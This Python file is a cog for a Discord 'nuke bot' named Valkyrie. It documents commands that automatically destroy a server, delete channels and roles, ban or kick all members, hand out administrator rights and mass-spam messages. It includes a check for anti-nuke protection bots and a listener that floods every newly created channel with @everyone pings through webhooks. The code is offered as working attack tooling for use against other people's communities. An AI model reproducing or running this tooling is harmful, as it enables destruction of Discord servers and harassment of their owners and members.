# coding: utf-8
import os
import time

try:
    import json
except:
    os.system('pip install json')
    import json
try:
    import aiohttp
except:
    os.system('pip install aiohttp')
    import aiohttp
try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio
try:
    import discord
except:
    os.system('pip install discord.py==1.7.3')
    import discord
try:
    import subprocess
except:
    os.system('pip install subprocess')
    import subprocess
try:
    import datetime
except:
    os.system('pip install datetime')
    import datetime

'''
import json
import aiohttp
import asyncio
import discord
import subprocess
import datetime
'''

from utils import *
from os import system, name
from discord import Permissions
from discord.ext.commands.core import cooldown
from colorama import Fore, Back, Style

from discord.ext import (
    commands,
    tasks
)


dr = DR = r = R = Fore.LIGHTRED_EX
g = G = Fore.LIGHTGREEN_EX
b = B = Fore.LIGHTBLUE_EX
m = M = Fore.LIGHTMAGENTA_EX
c = C = Fore.LIGHTCYAN_EX
y = Y = Fore.LIGHTYELLOW_EX
w = W = Fore.RESET
wh = WH = Fore.LIGHTWHITE_EX


class Help(commands.Cog):

    def __init__(self, client):
        self.client = client


    # Output a list of bot commands
    @commands.command()
    @commands.check(black_check)
    @commands.check(white_check)
    async def documentation(self, ctx):
        try:
            embed = discord.Embed(
                title = f'Documentation about nuke-bot Valyrie - command list',
                description = f'`<>` - *Required parameter.*  `[]` - *Optional parameter.*\n឵឵',
                color = 0x050319
            )
            embed.add_field(
                name = "Classic commands for interacting with the server",
                value = f"""឵឵
> `{ctx.prefix}attack` - Automatic destruction of the server.
> `{ctx.prefix}delchannels` - Deleting all channels.
> `{ctx.prefix}delroles` - Deleting all roles.
> `{ctx.prefix}channels` - Creating multiple channels.
> `{ctx.prefix}roles` - Creating multiple roles.
> `{ctx.prefix}rename` - Changing the name of the server.
> `{ctx.prefix}delemoji` - Delete all server emojis.\n឵឵""",
                inline = False
            )
            embed.add_field(
                name = "Commands for interaction by participants",
                value = f"""឵឵
> `{ctx.prefix}kick_all` - Kick all the participants.
> `{ctx.prefix}ban_all` - Ban all participants.\n឵឵""",
                inline = False
            )
            embed.add_field(
                name = "Commands for interacting with roles",
                value = f"""឵឵
> `{ctx.prefix}admin` - Give yourself a role with administrator rights.**
> `{ctx.prefix}everyone_admin` - Grant administrator rights to all participants.**\n឵឵""",
                inline = False
            )
            embed.add_field(
                name = "Commands for calling spam/flood",
                value = f"""឵឵
> `{ctx.prefix}spam` - Mass sending of messages in one channel.
> `{ctx.prefix}allspam` - Mass sending of messages in all channels.
> `{ctx.prefix}wepbhook_spam` - Mass sending of messages via webhook.
> `{ctx.prefix}dmspam <@Ping | ID>` - Mass sending of messages to the bos mentioned.\n឵឵""",
                inline = False
            )
            embed.add_field(
                name = "Custom commands for interacting with the server",
                value = f"""឵឵
> `{ctx.prefix}customchan <Count | Name>` - Creating channels with a prescribed name.
> `{ctx.prefix}customroles <Count | Name>` - Creating roles with a prescribed name.
> `{ctx.prefix}customspam <Count | Text>` - Sending messages by your text.
> `{ctx.prefix}customname <Name>` - Changing the server name to the prescribed one.\n឵឵""",
                inline = False
            )
            embed.set_footer(
                icon_url = self.client.get_user(848621214935154738).avatar_url, 
                text = "© ! Walter Schwartz#7393 | Blood Group - All rights reserved!"
            )
            await ctx.author.send(embed=embed)
        except Exception as e: print(e)



    # Output of information about the server
    @commands.command()
    @commands.check(black_check)
    @commands.check(white_check)
    async def information(self, ctx):
        try:
            embed = discord.Embed(
                title = f'Valkyrie | Information about server "{ctx.guild.name}"',
                description = f"""
> **Server ID:** `{ctx.guild.id}`
> **Owner:** `{ctx.guild.owner}`
> **All users:** `{len(ctx.guild.members)}`
> **All channels:** `{len(ctx.guild.channels)}`
> **All roles:** `{len(ctx.guild.roles)}`
> **Nuker:** `{ctx.author}`

> **Text Channels:** `{len(ctx.guild.text_channels)}`
> **Voice Channels:** `{len(ctx.guild.voice_channels)}`
> **Categories:** `{len(ctx.guild.categories)}`

> **All users:** `{len(ctx.guild.members)}`
> **People:** `{len([m for m in ctx.guild.members if not m.bot])}`
> **Bots:** `{len([m for m in ctx.guild.members if m.bot])}`
> **Administrators:** `{len([m for m in ctx.guild.members if m.guild_permissions.administrator])}`
> **Moderators:** `{len([m for m in ctx.guild.members if m.guild_permissions.kick_members])}`

> **All roles:** `{len(ctx.guild.roles)}`
> **Moderation roles:** `{len([r for r in ctx.guild.roles if r.permissions.kick_members])}`
> **Administration roles:** `{len([r for r in ctx.guild.roles if r.permissions.administrator])}`

> **AR-Protect:** `{958655045698736158 in [m.id for m in ctx.guild.members if m.bot]}`
> **Lavan:** `{704967695036317777 in [m.id for m in ctx.guild.members if m.bot]}`
> **Vega:** `{795551166393876481 in [m.id for m in ctx.guild.members if m.bot]}`
> **Wick:** `{536991182035746816 in [m.id for m in ctx.guild.members if m.bot]}`
> **Nue:** `{1053378220948471918 in [m.id for m in ctx.guild.members if m.bot]}`
> **K-Protect:** `{1025731593584791663 in [m.id for m in ctx.guild.members if m.bot]}`

```py
False - The anti-nuke bot is missing.  True - The anti-nuke bot is present.
```
""",
                color = 0x050404
            )
            embed.set_image(url='https://media.discordapp.net/attachments/1083690678837588068/1090698201553707100/IMG_6839.gif')
            embed.set_footer(
                icon_url = self.client.get_user(848621214935154738).avatar_url, 
                text = "© ! Walter Schwartz#7393 | Blood Group - All rights reserved!"
            )
            await ctx.author.send(embed=embed)
        except Exception as e: print(e)



    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        try:
            try:
                with open("json/white_list.json", 'r', encoding="utf-8") as wl:
                    white_list = json.load(wl)
            except Exception as e: print(e)

            if guild.id in white_list:
                await guild.leave()
            else:
                pass
        except Exception as e: print(e)



    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            embed = discord.Embed(
                title = 'Command cooldown',
                description = f"> {ctx.author.mention}, you have already used the command `{ctx.message.content}`. It will be available again in about `{error.retry_after}` seconds.",
                color = 0x050404
            )
            await ctx.author.send(embed=embed)
        else:
            pass


    """ Documentation: What is a 'on_guild_channels_create'?

This event allows the bot to immediately respond to the creation of new channels on the server.
This is necessary for the complete neutralization of the server administration (spam causes severe inhibitions)
and a powerful PR company of your server/group/community through this bot. 

This event works especially effectively after using the following commands:

・ !attack - Automatic server destruction.

・ !channels - Mass creation of spam-channels.

・ !customchan <Count | Name> - Mass creation of channels with the specified name.

The three above-mentioned commands create a large number of channels, which causes an immediate reaction
of the bot in the form of mass spam. If the server is destroyed, try not to manually create separate channels,
as this will also cause an immediate reaction of the bot, but it will not cause any damage to the server.

    """


    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):

        embed = discord.Embed(
            title = f'''Valkyrie - You Spammed by Network Anarchy Syndicate!''',
            description = f'''{spam_text}''',
            color = 0x050404
        )
        embed.set_image(url='https://media.discordapp.net/attachments/1102160843656933457/1103645963190554715/ezgif-5-03698408b2.gif') 

        try:
            webhook = await channel.create_webhook(name=nuke_webhook_name)
            webhook_url = webhook.url
            async with aiohttp.ClientSession() as session:
                webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
                for i in range(5):
                    await webhook.send(f'@everyone', embed=embed)

        except:
            try:
                for i in range(5):
                    await channel.send(f'@everyone', embed=embed)
            except:
                pass


    @commands.Cog.listener()
    async def on_ready(self): # Уведомление о том, что бот запущен.
        clear = lambda: os.system('cls')
        clear()
        
        print(banner)
        print(f'''
{Fore.RED}[] Nick: {wh}{self.client.user}
{Fore.RED}[] Link: {wh}https://discord.com/api/oauth2/authorize?client_id={self.client.user.id}&permissions=8&scope=bot

{Fore.BLUE}   ##################################################################################################{wh}
''')


def setup(client):
    client.add_cog(Help(client))